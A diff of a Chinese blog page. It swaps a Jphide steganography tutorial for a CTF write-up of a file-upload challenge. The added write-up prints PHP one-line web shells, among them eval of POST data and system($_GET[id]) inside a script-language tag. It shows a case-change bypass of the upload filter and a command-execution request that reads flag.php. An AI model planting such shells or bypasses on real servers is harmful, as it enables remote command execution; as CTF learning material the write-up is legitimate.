@@ -59,34 +59,36 @@
 
 
 
-<meta name="description" content="深入理解JPEG图像格式Jphide隐写0x00 隐写原理Jphide是基于最低有效位LSB的JPEG格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。
-由于JPEG图像格式使用离散余弦变换（Discrete Cosine Transfo">
+<meta name="description" content="0x00 前言i春秋和百度联合推出的一个CTF比赛，由于本人太菜。只能随便玩玩，多学多问。
+0x01 正文Upload题目Upload描述：想怎么传就怎么传，就是这么任性。tips:flag在flag.php中    
+解题思路打开题目题目链接，是一个文件上传的题。然后打开/flag.php直接上传传统的PHP一句话1&amp;lt;?php eval_r($_POST[sb])?&amp;gt;
+发现过滤了 &amp;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="深入理解JPEG图像格式Jphide隐写">
-<meta property="og:url" content="http://uknow.top/undefined/深入理解JPEG图像格式Jphide隐写20160812/index.html">
+<meta property="og:title" content="百度杯CTF比赛Writeup">
+<meta property="og:url" content="http://uknow.top/undefined/百度杯CTF比赛Writeup20160903/index.html">
 <meta property="og:site_name" content="Uknow’s Blog">
-<meta property="og:description" content="深入理解JPEG图像格式Jphide隐写0x00 隐写原理Jphide是基于最低有效位LSB的JPEG格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。
-由于JPEG图像格式使用离散余弦变换（Discrete Cosine Transfo">
-<meta property="og:image" content="http://i.imgur.com/kb6USbH.png">
-<meta property="og:image" content="http://i.imgur.com/BzbsFlS.png">
-<meta property="og:image" content="http://i.imgur.com/C8DQKFo.png">
-<meta property="og:image" content="http://i.imgur.com/ciEvX2s.png">
-<meta property="og:image" content="http://i.imgur.com/kipH6L0.png">
-<meta property="og:image" content="http://i.imgur.com/ImK54U1.png">
-<meta property="og:image" content="http://i.imgur.com/QYrSVtE.png">
-<meta property="og:image" content="http://i.imgur.com/XfbEvQS.png">
-<meta property="og:image" content="http://i.imgur.com/sj8X3aP.png">
-<meta property="og:image" content="http://i.imgur.com/HPkvnci.png">
-<meta property="og:image" content="http://i.imgur.com/H9QJnHU.jpg">
-<meta property="og:image" content="http://i.imgur.com/i3zeRUx.png">
-<meta property="og:image" content="http://i.imgur.com/aCnBL4u.png">
-<meta property="og:image" content="http://i.imgur.com/1whWnla.png">
-<meta property="og:updated_time" content="2016-08-12T09:58:46.555Z">
+<meta property="og:description" content="0x00 前言i春秋和百度联合推出的一个CTF比赛，由于本人太菜。只能随便玩玩，多学多问。
+0x01 正文Upload题目Upload描述：想怎么传就怎么传，就是这么任性。tips:flag在flag.php中    
+解题思路打开题目题目链接，是一个文件上传的题。然后打开/flag.php直接上传传统的PHP一句话1&amp;lt;?php eval_r($_POST[sb])?&amp;gt;
+发现过滤了 &amp;">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224648.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224800.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225057.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225859.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903230202.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8721.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903231450.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png">
+<meta property="og:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903232502.png">
+<meta property="og:updated_time" content="2016-09-03T15:31:34.298Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="深入理解JPEG图像格式Jphide隐写">
-<meta name="twitter:description" content="深入理解JPEG图像格式Jphide隐写0x00 隐写原理Jphide是基于最低有效位LSB的JPEG格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。
-由于JPEG图像格式使用离散余弦变换（Discrete Cosine Transfo">
-<meta name="twitter:image" content="http://i.imgur.com/kb6USbH.png">
+<meta name="twitter:title" content="百度杯CTF比赛Writeup">
+<meta name="twitter:description" content="0x00 前言i春秋和百度联合推出的一个CTF比赛，由于本人太菜。只能随便玩玩，多学多问。
+0x01 正文Upload题目Upload描述：想怎么传就怎么传，就是这么任性。tips:flag在flag.php中    
+解题思路打开题目题目链接，是一个文件上传的题。然后打开/flag.php直接上传传统的PHP一句话1&amp;lt;?php eval_r($_POST[sb])?&amp;gt;
+发现过滤了 &amp;">
+<meta name="twitter:image" content="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224648.png">
 
 
 
@@ -104,7 +106,7 @@
   };
 </script>
 
-  <title> 深入理解JPEG图像格式Jphide隐写 | Uknow’s Blog </title>
+  <title> 百度杯CTF比赛Writeup | Uknow’s Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -234,7 +236,7 @@
             
             
               
-                深入理解JPEG图像格式Jphide隐写
+                百度杯CTF比赛Writeup
               
             
           </h1>
@@ -246,8 +248,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-12T17:56:19+08:00" content="2016-08-12">
-              2016-08-12
+            <time itemprop="dateCreated" datetime="2016-09-03T22:43:52+08:00" content="2016-09-03">
+              2016-09-03
             </time>
           </span>
 
@@ -257,8 +259,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/undefined/深入理解JPEG图像格式Jphide隐写20160812/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="undefined/深入理解JPEG图像格式Jphide隐写20160812/" itemprop="commentsCount"></span>
+                <a href="/undefined/百度杯CTF比赛Writeup20160903/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="undefined/百度杯CTF比赛Writeup20160903/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -268,7 +270,7 @@
 
           
           
-             <span id="/undefined/深入理解JPEG图像格式Jphide隐写20160812/" class="leancloud_visitors" data-flag-title="深入理解JPEG图像格式Jphide隐写">
+             <span id="/undefined/百度杯CTF比赛Writeup20160903/" class="leancloud_visitors" data-flag-title="百度杯CTF比赛Writeup">
                &nbsp; | &nbsp;
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -289,65 +291,23 @@
       
 
       
-        <h1 id="深入理解JPEG图像格式Jphide隐写"><a href="#深入理解JPEG图像格式Jphide隐写" class="headerlink" title="深入理解JPEG图像格式Jphide隐写"></a>深入理解JPEG图像格式Jphide隐写</h1><h2 id="0x00-隐写原理"><a href="#0x00-隐写原理" class="headerlink" title="0x00 隐写原理"></a>0x00 隐写原理</h2><p>Jphide是基于最低有效位LSB的<a href="http://www.cnblogs.com/leaven/archive/2010/04/06/1705846.html" target="_blank" rel="external">JPEG格式</a>图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在<a href="https://en.wikipedia.org/wiki/Discrete_cosine_transform" target="_blank" rel="external">DCT变换域</a>上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时<a href="http://baike.baidu.com/link?url=OWM-kQRYlFaJ2Sy7m1E_Z_-fnvknJTRSHwk1f3eoabLsbht1TJa07GmvWRoiOg6U7-0-Ey3vb_UHcDm9Pc7Mgq" target="_blank" rel="external">Blowfish算法</a>有较强的抗统计检测能力。</p>
-<p>由于JPEG图像格式使用<a href="http://baike.baidu.com/view/391624.htm?fr=aladdin&amp;fromtitle=DCT&amp;fromid=4184&amp;type=syn" title="DCT&amp;fromid=4184&amp;type=syn" target="_blank" rel="external">离散余弦变换</a>（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种<a href="http://baike.baidu.com/link?url=7eIl--nFUaz-amKaY9jatpW4J-J2JyZEXy8dYJM4Py1CspzR9mUATKgTyXOCt7M6AjFSv4JmF3YKtXTTAauHm_" target="_blank" rel="external">有损压缩</a>（Loss Compression）技术，但一般不会影响图像的视觉效果。</p>
-<h2 id="0x01-隐写过程"><a href="#0x01-隐写过程" class="headerlink" title="0x01 隐写过程"></a>0x01 隐写过程</h2><p>Jphide隐写过程大致为：先解压压缩JPEG图像，得到DCT系数；然后对隐藏信息用户给定的密码进行Blowfish加密；再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片，下面是个人对隐写过程理解画出的大致流程图。</p>
-<p><img src="http://i.imgur.com/kb6USbH.png" alt=""></p>
-<a id="more"></a>
-<h2 id="0x02-隐写实现"><a href="#0x02-隐写实现" class="headerlink" title="0x02 隐写实现"></a>0x02 隐写实现</h2><p><strong>（1）Stegdetect</strong></p>
-<p>实现JPEG图像Jphide隐写算法工具有多个，比如由Neils Provos开发通过统计分析技术评估JPEG文件的DCT频率系数的隐写工具<a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">Stegdetect</a>，它可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过Jphide、outguess和jsteg-shell方式嵌入的隐藏信息。</p>
-<p><strong>（2）JPHS</strong></p>
-<p>而这里介绍另一款JPEG图像的信息隐藏软件<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/programs.htm" target="_blank" rel="external">JPHS</a>，它是由Allan Latham开发设计实现在Windows和Linux系统平台针对有损压缩JPEG文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序JPHIDE和JPSEEK， JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能，而JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件，Windows版本的JPHS里的JPHSWIN程序具有图形化操作界面且具备JPHIDE和JPSEEK的功能。</p>
-<p><img src="http://i.imgur.com/BzbsFlS.png" alt=""></p>
-<p>1.Windows用户请下载<a href="http://io.acad.athabascau.ca/~grizzlie/Comp607/jphs05.zip" target="_blank" rel="external">JPHS-05 for Windows</a>,同时也提供下载<a href="http://linux01.gwdg.de/~alatham/stego.html" target="_blank" rel="external">Linux版本</a>。</p>
-<p>2.分别准备一个JPEG格式的图片（example.jpg）和一个文本文件（flag.txt）。</p>
-<p><img src="http://i.imgur.com/C8DQKFo.png" alt=""></p>
-<p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p>
-<p>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0），JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记为0xFFD8，之后2个字节接着便是应用程序保留标记为0xFFE0，应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节，表示包括本字段但不包括标记代码的总长度，这里为10个字节，第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串，第三个字段是版本号占2个字节，这里是0X0101，表示JFIF的版本号为1.1，但也可能为其它数值，从而代表了其它版本号。</p>
-<p><img src="http://i.imgur.com/ciEvX2s.png" alt=""></p>
-<p>3.Windows版本可以使用具有图形化操作界面的Jphswin，选择“Open jpeg”打开示例JPEG格式图片example.jpg</p>
-<p><img src="http://i.imgur.com/kipH6L0.png" alt=""></p>
-<p>如果你选择的不是JPEG格式的图片程序会自动退出，你可以16进制编辑器如Winhex查看图片的图像开始标记SOI和应用程序保留标记APP0，当载入JPEG格式图片会显示一些图片的属性。</p>
-<p><img src="http://i.imgur.com/ImK54U1.png" alt=""></p>
-<p>4.选择“Hide”选项之后在两次文本框输入相同的密码，这里以输入flag作为密码为例，然后输入要包含隐藏信息的文本。</p>
-<p><img src="http://i.imgur.com/QYrSVtE.png" alt=""></p>
-<p>5.选择将要隐藏的信息如flag.txt。</p>
-<p><img src="http://i.imgur.com/XfbEvQS.png" alt=""></p>
-<p>6.选择“Save jpeg as”选项将图片另存为jpeg格式并输入文件的名称为新的图像文件如C4n-u-find-f14g.jpg。</p>
-<p><img src="http://i.imgur.com/sj8X3aP.png" alt=""></p>
-<p>7.之后便可以看到生成结果和相关信息。</p>
-<p><img src="http://i.imgur.com/HPkvnci.png" alt=""></p>
-<p>8.第2步到第7步做的是Jhide方式信息隐藏，接下来我们从C4n-u-find-f14g.jpg图片提取出隐藏信息。</p>
-<p><img src="http://i.imgur.com/H9QJnHU.jpg" alt=""></p>
-<p>9.如果之前你并不知道图片是基于什么方式进行信息隐藏，你可以使用Stegdetect先进行探测。</p>
-<p>Stegdetect的主要选项如下：</p>
-<blockquote>
-<p>-q  仅显示可能包含隐藏内容的图像。</p>
-<p>-n  启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。</p>
-<p>-s  修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</p>
-<p>-d  打印带行号的调试信息。</p>
-<p>-t  设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</p>
-<ul>
-<li>j  检测图像中的信息是否是用jsteg嵌入的。</li>
-<li>o  检测图像中的信息是否是用outguess嵌入的。</li>
-<li>p  检测图像中的信息是否是用jphide嵌入的。</li>
-<li>i  检测图像中的信息是否是用invisible secrets嵌入的。</li>
-</ul>
-<p>-V 显示软件版本号。</p>
-<p>如果检测结果显示该文件可能包含隐藏信息，那么Stegdetect会在检测结果后面使用1～3颗星来标识</p>
-<p>隐藏信息存在的可能性大小，3颗星表示隐藏信息存在的可能性最大。</p>
-</blockquote>
-<p>从下图可以看出很可能是Jphide的信息隐藏方式：</p>
-<p><img src="http://i.imgur.com/i3zeRUx.png" alt=""></p>
-<p>10.在知道隐藏方式之后可以开始进行信息提取，和使用JPHS进行信息隐藏过程类似，打开需要提取隐藏信息的图片C4n-u-find-f14g.jpg，输入对应密码（在不知道密码的情况不可以尝试Stegdetect工具里的Stegbreak程序进行基于字典的暴力攻击）flag，密码验证通过JPHS会自动提取隐藏信息，之后便可以另存提取出的信息。</p>
-<p><img src="http://i.imgur.com/aCnBL4u.png" alt=""></p>
-<p>11.打开提取得到的find.txt便可以得到我们想要的隐藏信息。</p>
-<p><img src="http://i.imgur.com/1whWnla.png" alt=""></p>
-<h2 id="0x03-参考资料"><a href="#0x03-参考资料" class="headerlink" title="0x03 参考资料"></a>0x03 参考资料</h2><p><a href="http://mall.cnki.net/magazine/article/JSJC201006056.htm" target="_blank" rel="external">Jphide原理剖析及检测</a></p>
-<p></p><p><a href="http://www.cnki.com.cn/Article/CJFDTotal-JSJC200707054.htm" target="_blank" rel="external">基于二次加密的JPhide隐写检测方法</a></p>
-<ul>
-<li>转载自<a href="https://www.hackfun.org/" target="_blank" rel="external">4ido10n’s Blog</a>文章<a href="https://www.hackfun.org/CTF/jphide-steganography.html" target="_blank" rel="external">《深入理解JPEG图像格式Jphide隐写》</a></li>
-</ul>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>i春秋和百度联合推出的一个CTF比赛，由于本人太菜。只能随便玩玩，多学多问。</p>
+<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>Upload<br>描述：想怎么传就怎么传，就是这么任性。<br>tips:flag在flag.php中    </p>
+<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>打开题目题目链接，是一个文件上传的题。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224648.png" alt=""><br>然后打开/flag.php<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903224800.png" alt=""><br>直接上传传统的PHP一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval_r($_POST[sb])?&gt;</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225057.png" alt=""><br>发现过滤了 &lt;?php</p>
+<p>然后在网上找到了另一种php一句话的木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903225859.png" alt=""><br>查看源码显示过滤了php</p>
+<p>php改为PHP继续上传<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903230202.png" alt=""><br>查看源码没有显示</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8721.png" alt=""><br>找这里就没思路了，吃饭。去图书馆，下午回来问问大表哥</p>
+<p>表哥告诉我不要传传统的PHP一句话<br>换个姿势，然后告诉我 PHP有4种开始和结束标记<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>果断百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">1.</div><div class="line">&lt;?php echo &apos;if you want to serve XHTML or XML documents, do like this&apos;; ?&gt;</div><div class="line"></div><div class="line">2.</div><div class="line">&lt;script language=&quot;php&quot;&gt;</div><div class="line">echo &apos;some editors (like FrontPage) don&apos;t</div><div class="line">like processing instructions&apos;;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">3.</div><div class="line">&lt;? echo &apos;this is the simplest, an SGML processing instruction&apos;; ?&gt;</div><div class="line">&lt;?= expression ?&gt; This is a shortcut for &quot;&lt;? echo expression ?&gt;&quot;</div><div class="line"></div><div class="line">4.</div><div class="line">&lt;% echo &apos;You may optionally use ASP-style tags&apos;; %&gt;</div><div class="line">&lt;%= $variable; # This is a shortcut for &quot;&lt;% echo . . .&quot; %&gt;</div></pre></td></tr></table></figure></p>
+<p>发现第二种上午用过，但是不行<br>表哥说换个姿势，用system()函数调用系统命令<br>由于个人能力太差，写了半天才写出一句话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>PHP大写绕过，上传！<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903231450.png" alt=""><br>执行3.php?id=ls<br>发现php_errors.log日志文件，找到表哥说的绝对路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/var/www/html/u</div></pre></td></tr></table></figure></p>
+<p>然后表哥说直接命令查就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pwd  //同样得到 /var/www/html/u</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%8717.png" alt=""><br>然后利用cat 查看文件内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">1．命令格式：</div><div class="line"></div><div class="line">cat [选项] [文件]...</div><div class="line"></div><div class="line">2．命令功能：</div><div class="line"></div><div class="line">cat主要有三大功能：</div><div class="line"></div><div class="line">1.一次显示整个文件:cat filename</div><div class="line"></div><div class="line">2.从键盘创建一个文件:cat &gt; filename 只能创建新文件,不能编辑已有文件.</div><div class="line"></div><div class="line">3.将几个文件合并为一个文件:cat file1 file2 &gt; file</div><div class="line"></div><div class="line">3．命令参数：</div><div class="line"></div><div class="line">-A, --show-all           等价于 -vET</div><div class="line"></div><div class="line">-b, --number-nonblank    对非空输出行编号</div><div class="line"></div><div class="line">-e                       等价于 -vE</div><div class="line"></div><div class="line">-E, --show-ends          在每行结束处显示 $</div><div class="line"></div><div class="line">-n, --number     对输出的所有行编号,由1开始对所有输出的行数编号</div><div class="line"></div><div class="line">-s, --squeeze-blank  有连续两行以上的空白行，就代换为一行的空白行 </div><div class="line"></div><div class="line">-t                       与 -vT 等价</div><div class="line"></div><div class="line">-T, --show-tabs          将跳格字符显示为 ^I</div><div class="line"></div><div class="line">-u                       (被忽略)</div><div class="line"></div><div class="line">-v, --show-nonprinting   使用 ^ 和 M- 引用，除了 LFD 和 TAB 之外</div></pre></td></tr></table></figure></p>
+<p>根据上面的知识，构建下面的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.../u/3.php?id=cat /var/www/html/flag.php</div></pre></td></tr></table></figure></p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160903232502.png" alt=""><br>查看源码得到flag,唉！不容易，自己的知识太少了。</p>
+<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p>flag{90969a8b-9e19-4247-8654-a10eeeb48314}</p>
+<h4 id="此题小结"><a href="#此题小结" class="headerlink" title="此题小结"></a>此题小结</h4><p>才发现做个CTF不是那么容易的，一个看起来简单的上传绕过的题目。包含了PHP，Linxu系统命令，等等很多内容。也发现了自己有很多不足。幸亏有表哥的帮助，在此感觉依风表哥帮助和指导，下面两个题等明天在看别人的Writeup或者请教表哥吧！</p>
 
       
     </div>
@@ -365,17 +325,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/undefined/CTF工具以及脚本的整理20160811/" rel="next" title="CTF工具以及脚本的整理 ">
-                <i class="fa fa-chevron-left"></i> CTF工具以及脚本的整理 
+              <a href="/undefined/MySQL数据库基础与实例20160902/" rel="next" title="MySQL数据库基础与实例">
+                <i class="fa fa-chevron-left"></i> MySQL数据库基础与实例
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/undefined/CTF中图片隐藏文件分离方法总结20160812/" rel="prev" title="CTF中图片隐藏文件分离方法总结">
-                CTF中图片隐藏文件分离方法总结 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -424,8 +380,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="undefined/深入理解JPEG图像格式Jphide隐写20160812/"
-           data-title="深入理解JPEG图像格式Jphide隐写" data-url="http://uknow.top/undefined/深入理解JPEG图像格式Jphide隐写20160812/">
+      <div class="ds-thread" data-thread-key="undefined/百度杯CTF比赛Writeup20160903/"
+           data-title="百度杯CTF比赛Writeup" data-url="http://uknow.top/undefined/百度杯CTF比赛Writeup20160903/">
       </div>
     
   </div>
@@ -540,7 +496,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#深入理解JPEG图像格式Jphide隐写"><span class="nav-number">1.</span> <span class="nav-text">深入理解JPEG图像格式Jphide隐写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-隐写原理"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 隐写原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-隐写过程"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 隐写过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-隐写实现"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 隐写实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-参考资料"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 参考资料</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-正文"><span class="nav-number">2.</span> <span class="nav-text">0x01 正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Upload"><span class="nav-number">2.1.</span> <span class="nav-text">Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#题目"><span class="nav-number">2.1.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解题思路"><span class="nav-number">2.1.2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Flag"><span class="nav-number">2.1.3.</span> <span class="nav-text">Flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#此题小结"><span class="nav-number">2.1.4.</span> <span class="nav-text">此题小结</span></a></li></ol></li></ol></li></ol></div>
             
           </div>
         </section>
